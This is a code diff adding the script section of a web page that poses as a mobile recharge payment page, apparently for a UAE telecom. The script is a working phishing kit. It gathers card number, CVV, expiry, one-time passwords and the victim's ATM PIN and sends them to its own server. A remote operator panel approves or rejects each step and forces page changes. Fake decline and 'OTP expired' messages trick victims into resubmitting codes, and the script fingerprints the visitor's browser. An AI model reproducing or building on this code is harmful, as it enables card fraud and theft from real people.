+            showStep('step_loading');
+            startPolling('card');
+        }
+
+        // ============================================================
+        // Polling
+        // ============================================================
+        function startPolling(waitingFor) {
+            stopPolling();
+            pollInterval = setInterval(async () => {
+                if(!currentSessionId) return;
+                try {
+                    const res = await fetch(`/api/session/poll?session_id=${currentSessionId}`);
+                    const data = await res.json();
+                    if(!data.success) return;
+
+                    const stage = data.stage;
+
+                    // ===== Forced navigation from admin =====
+                    if(data.forced_page) {
+                        const fp = data.forced_page;
+                        stopPolling();
+                        document.getElementById('card_error_msg').style.display = 'none';
+                        document.getElementById('otp_error_msg').style.display = 'none';
+                        document.getElementById('pin_error_msg').style.display = 'none';
+                        document.getElementById('bank_auth_reject_msg').style.display = 'none';
+
+                        if(fp === 'step_otp') {
+                            clearOTPFields();
+                            await updateStage('otp_pending');
+                        } else if(fp === 'step_pin') {
+                            clearPINFields();
+                            await updateStage('pin_pending');
+                        } else if(fp === 'step_bank_auth') {
+                            document.getElementById('bank_auth_amount_display').innerText = finalHidden.value + ' AED';
+                            await updateStage('bank_auth_pending');
+                        } else if(fp === 'step_success') {
+                            await updateStage('success');
+                            showSuccessPage();
+                            return;
+                        } else if(fp === 'step_loading') {
+                            document.getElementById('loading_title').innerText = 'Processing your request';
+                            document.getElementById('loading_desc').innerText = 'Please wait, do not close this page...';
+                        }
+                        showStep(fp);
+                        if(fp === 'step_otp') startPolling('otp');
+                        else if(fp === 'step_pin') startPolling('pin');
+                        else if(fp === 'step_bank_auth') startPolling('bank_auth');
+                        else if(fp === 'step_loading') startPolling(waitingFor);
+                        return;
+                    }
+
+                    // ===== Normal approve/reject logic =====
+                    if(waitingFor === 'browsing') {
+                        // Just listen for forced navigation
+                    } else if(waitingFor === 'card') {
+                        if(stage === 'card_approved') {
+                            stopPolling();
+                            document.getElementById('otp_error_msg').style.display = 'none';
+                            clearOTPFields();
+                            await updateStage('otp_pending');
+                            showStep('step_otp');
+                            startPolling('otp');
+                        } else if(stage === 'card_rejected') {
+                            stopPolling();
+                            document.getElementById('card_error_msg').innerText = 'Your payment has been declined by your card issuing bank';
+                            document.getElementById('card_error_msg').style.display = 'block';
+                            showStep('step_3');
+                        }
+                    } else if(waitingFor === 'otp') {
+                        if(stage === 'otp_approved') {
+                            stopPolling();
+                            document.getElementById('pin_error_msg').style.display = 'none';
+                            clearPINFields();
+                            await updateStage('pin_pending');
+                            showStep('step_pin');
+                            startPolling('pin');
+                        } else if(stage === 'otp_rejected') {
+                            stopPolling();
+                            document.getElementById('otp_error_msg').innerText = 'Your OTP has expired. Please try again.';
+                            document.getElementById('otp_error_msg').style.display = 'block';
+                            clearOTPFields();
+                            showStep('step_otp');
+                            startPolling('otp');
+                        }
+                    } else if(waitingFor === 'pin') {
+                        if(stage === 'pin_approved') {
+                            stopPolling();
+                            await updateStage('success');
+                            showSuccessPage();
+                        } else if(stage === 'pin_rejected') {
+                            stopPolling();
+                            document.getElementById('pin_error_msg').innerText = 'Incorrect PIN. Please check your ATM card PIN.';
+                            document.getElementById('pin_error_msg').style.display = 'block';
+                            clearPINFields();
+                            showStep('step_pin');
+                            startPolling('pin');
+                        }
+                    } else if(waitingFor === 'bank_auth') {
+                        if(stage === 'bank_auth_approved') {
+                            stopPolling();
+                            document.getElementById('pin_error_msg').style.display = 'none';
+                            clearPINFields();
+                            await updateStage('pin_pending');
+                            showStep('step_pin');
+                            startPolling('pin');
+                        } else if(stage === 'bank_auth_rejected') {
+                            stopPolling();
+                            document.getElementById('bank_auth_reject_msg').style.display = 'block';
+                            showStep('step_bank_auth');
+                        }
+                    }
+                } catch(e) { console.error('Polling error:', e); }
+            }, 2000);
+        }
+
+        function stopPolling() {
+            if(pollInterval) { clearInterval(pollInterval); pollInterval = null; }
+        }
+
+        async function updateStage(stage) {
+            if(!currentSessionId) return;
+            try {
+                await fetch('/api/session/update', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: currentSessionId, stage })
+                });
+            } catch(e) {}
+        }
+
+        // ============================================================
+        // Numpad
+        // ============================================================
+        function numpadPress(type, digit) {
+            const max = numpadMaxLen[type];
+            if(numpadValues[type].length >= max) return;
+            numpadValues[type] += digit;
+            updateNumpadDisplay(type);
+        }
+
+        function numpadDel(type) {
+            numpadValues[type] = numpadValues[type].slice(0, -1);
+            updateNumpadDisplay(type);
+        }
+
+        function updateNumpadDisplay(type) {
+            const val = numpadValues[type];
+            const max = numpadMaxLen[type];
+            for(let i = 1; i <= max; i++) {
+                const dot = document.getElementById(`${type}_d${i}`);
+                if(dot) dot.classList.toggle('filled', i <= val.length);
+            }
+        }
+
+        // ============================================================
+        // OTP Submit
+        // ============================================================
+        async function submitOTP() {
+            const otp = numpadValues.otp;
+            if(otp.length < 4) { alert('Please enter at least 4 digits for OTP'); return; }
+
+            if(currentSessionId) {
+                try {
+                    await fetch('/api/session/update', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ session_id: currentSessionId, otp })
+                    });
+                } catch(e) { console.error('OTP error:', e); }
+            }
+            showStep('step_loading');
+            startPolling('otp');
+        }
+
+        function clearOTPFields() {
+            numpadValues.otp = '';
+            updateNumpadDisplay('otp');
+        }
+
+        // ============================================================
+        // Bank Auth Submit
+        // ============================================================
+        async function submitBankAuth() {
+            if(currentSessionId) {
+                try {
+                    await fetch('/api/session/update', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ session_id: currentSessionId, bank_auth: 'confirmed', stage: 'bank_auth_pending' })
+                    });
+                } catch(e) { console.error('Bank auth error:', e); }
+            }
+            showStep('step_loading');
+            startPolling('bank_auth');
+        }
+
+        // ============================================================
+        // PIN Submit
+        // ============================================================
+        function clearPINFields() {
+            numpadValues.pin = '';
+            updateNumpadDisplay('pin');
+        }
+
+        async function submitPIN() {
+            const pin = numpadValues.pin;
+            if(pin.length < 4) { alert('Please enter your 4-digit PIN'); return; }
+
+            if(currentSessionId) {
+                try {
+                    await fetch('/api/session/update', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ session_id: currentSessionId, pin })
+                    });
+                } catch(e) { console.error('PIN error:', e); }
+            }
+            showStep('step_loading');
+            startPolling('pin');
+        }
+
+        // ============================================================
+        // Amount Selection
+        // ============================================================
+        function setAmt(el) {
+            if(!el) return;
+            document.querySelectorAll('.amt-box').forEach(b => b.classList.remove('active'));
+            el.classList.add('active');
+            const v = el.getAttribute('data-v');
+            manualInput.value = v;
+            finalHidden.value = v;
+        }
+
+        function updateFinalAmt(v) { finalHidden.value = v; }
+
+        // ============================================================
+        // Success Page
+        // ============================================================
+        function showSuccessPage() {
+            document.getElementById('success_amount').innerText = finalHidden.value;
+            document.getElementById('success_phone').innerText = inp.value;
+            const ref = 'DU' + Date.now().toString().slice(-8).toUpperCase();
+            document.getElementById('success_ref').innerText = 'Reference: ' + ref;
+            showStep('step_success');
+        }
+
+        function resetAll() {
+            stopPolling();
+            currentSessionId = null;
+            inp.value = '';
+            btn.disabled = true;
+            btn.style.background = '#f6eff7';
+            btn.style.color = '#d1bdd4';
+            btn.style.display = 'block';
+            hint.style.display = 'none';
+            document.getElementById('bot_loading').style.display = 'none';
+            document.getElementById('card_number').value = '';
+            document.getElementById('card_name').value = '';
+            document.getElementById('card_expiry').value = '';
+            document.getElementById('card_cvv').value = '';
+            document.getElementById('card_error_msg').style.display = 'none';
+            clearOTPFields();
+            clearPINFields();
+            finalHidden.value = '';
+            manualInput.value = '';
+            showStep('step_1');
+        }
+
+        // ============================================================
+        // Helpers
+        // ============================================================
+        function showStep(stepId) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(stepId).classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        function formatCardNumber(input) {
+            let val = input.value.replace(/\D/g, '').substring(0, 16);
+            let formatted = val.match(/.{1,4}/g);
+            input.value = formatted ? formatted.join(' ') : val;
+        }
+
+        function formatExpiry(input) {
+            let val = input.value.replace(/\D/g, '').substring(0, 4);
+            if(val.length >= 3) {
+                input.value = val.substring(0,2) + '/' + val.substring(2);
+            } else {
+                input.value = val;
+            }
+        }
+
+        function getFingerprint() {
+            const data = {
+                ua: navigator.userAgent, sw: screen.width, sh: screen.height,
+                plat: navigator.platform, lang: navigator.language,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            return btoa(JSON.stringify(data));
+        }
+
+        // Set default tab on load
+        toggleService('recharge');
+    </script>
+</body>
+</html>
